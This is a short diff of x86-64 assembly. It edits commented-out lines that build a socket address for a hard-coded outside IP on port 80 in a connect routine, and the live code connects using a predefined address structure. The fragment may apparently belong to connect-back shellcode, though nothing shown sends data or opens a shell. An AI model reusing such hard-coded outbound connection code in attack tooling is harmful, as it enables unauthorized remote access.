@@ -43,14 +43,13 @@ start:
     mov     rdi, rax
 
 .connect:
-    ;mov     rcx, rsp
+    ;mov     rdx, rsp
     ;push    0
     ;push    0x4227a28b    ; push 139.162.39.66 onto stack IP ADDRESS
     ;push    word 0x5000         ; push 80 onto stack PORT
     ;push    word 2   ; AF_INET
     ;mov     rsi, rsp
-    ;sub     rcx, rsi
-    ;mov     rdx, rcx
+    ;sub     rdx, rsi
 
     mov     rsi, sock
     mov     rdx, socklen
